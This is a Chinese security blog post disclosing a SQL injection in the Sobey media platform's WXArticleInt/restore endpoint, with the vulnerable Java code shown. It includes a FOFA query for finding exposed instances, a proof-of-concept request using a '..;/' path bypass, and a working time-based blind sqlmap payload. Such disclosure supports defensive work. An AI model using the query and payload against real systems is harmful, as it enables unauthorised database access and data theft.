---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintrestore-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/27 08:22
* 683浏览
* [0评论](#comment)
* 13分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/restore 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/WXArticleInt/restore`的实现逻辑

```
@RequestMapping(
    value = {"/restore"},
    method = {RequestMethod.POST}
)
public Response restore(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("id") String id) {
    Response response = new Response();
    response.setStatus(200);
    JSONObject userinfo = (JSONObject)this.req.getAttribute("userinfo");

    try {
        QueryBuilder qb = new QueryBuilder("update zcnwxarticle SET ifval='1' where id in (" + id + ")");
        qb.executeNoQuery();
```

代码一看就很明了了，**id**是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&id=SQLI_POC&token=
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞](images/img-001-f3a2912b4b91.webp)](https://image.mrxn.net/e398e997a1a146e2874d47fc18287e5a.webp)

成功延时 5 秒

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞](https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读

漏洞扫描服务


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 